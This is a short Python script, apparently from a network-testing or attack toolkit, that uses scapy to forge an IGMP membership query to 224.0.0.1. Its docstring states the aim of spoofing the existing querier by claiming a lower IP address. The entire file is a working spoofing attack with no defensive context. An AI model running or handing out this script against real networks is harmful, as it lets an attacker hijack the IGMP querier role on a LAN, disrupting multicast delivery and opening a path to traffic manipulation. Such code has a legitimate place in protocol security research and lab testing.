#!venv/bin/python

from scapy.all import *
from scapy.contrib.igmp import IGMP
from scapy.all import Ether, IP
import settings
"""
Spoof the place of a querier with lower ip addr than him
"""

pck = Ether()/IP(src=settings.source_ip, dst="224.0.0.1")/IGMP(type=17, gaddr="0.0.0.0")
sendp(pck, iface=settings.source_interface)